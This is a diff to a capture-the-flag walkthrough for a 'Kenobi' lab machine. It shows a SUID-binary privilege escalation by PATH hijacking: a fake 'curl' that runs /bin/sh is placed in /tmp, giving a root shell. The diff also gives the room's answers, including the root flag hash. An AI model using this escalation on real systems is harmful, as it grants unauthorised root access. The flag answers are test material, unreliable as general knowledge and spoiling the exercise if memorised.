@@ -217,6 +217,66 @@ find / -perm -u=s -type f 2>/dev/null
 ```
 {: .nolineno }
 
-What file looks particularly out of the ordinary? 
+Q1. What file looks particularly out of the ordinary? 
 
-> ""
+> "/usr/bin/menu"
+
+Q2. Run the binary, how many options appear?
+
+> "3"
+
+```bash
+kenobi@kenobi:~$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :
+```
+{: .nolineno }
+
+This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).
+
+As this file runs as the root users privileges, we can manipulate our path gain a root shell.
+
+```bash
+kenobi@kenobi:/tmp$ echo /bin/sh > curl
+kenobi@kenobi:/tmp$ chmod 777 curl
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# id
+uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+# whoami
+root
+
+```
+{: .nolineno }
+
+Q3. We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!
+
+> "No answer needes"
+
+Q4. What is the root flag (/root/root.txt)?
+
+> "177b3cd8562289f37382721c28381f02"
+
+```bash
+# cd ..
+# ls
+bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
+boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
+# cd root
+# ls
+root.txt
+# cat root.txt
+177b3cd8562289f37382721c28381f02
+
+```
+{: .nolineno }
